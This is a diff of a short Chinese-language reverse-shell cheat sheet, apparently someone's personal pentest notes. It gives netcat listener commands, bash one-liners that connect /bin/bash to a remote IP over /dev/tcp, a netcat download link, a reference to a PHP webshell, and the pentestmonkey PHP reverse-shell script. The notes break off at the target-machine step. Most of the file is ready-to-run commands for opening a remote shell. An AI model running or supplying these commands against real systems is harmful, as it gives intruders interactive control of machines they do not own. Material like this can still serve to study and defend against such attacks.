@@ -1,15 +1,23 @@
 #bin/bash
 #利用 nc 等工具反弹 shell 这种方式:
+netcat下载 https://eternallybored.org/misc/netcat/
 首先在kali上输入：
-nc -lvp 7777
+nc -lvvp 7777
 
  /bin/bash -i >& /dev/tcp/111.111.111.111/9999 0>&1
 
 ########
  方法1：bash反弹
 bash -i >& /dev/tcp/ip/port 0>&1
-方法2 执行php
+
+方法2 
+使用大码:license.php 选择php
+
+方法3 执行php
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+
+
 #######
 
 然后在目标机上输入：
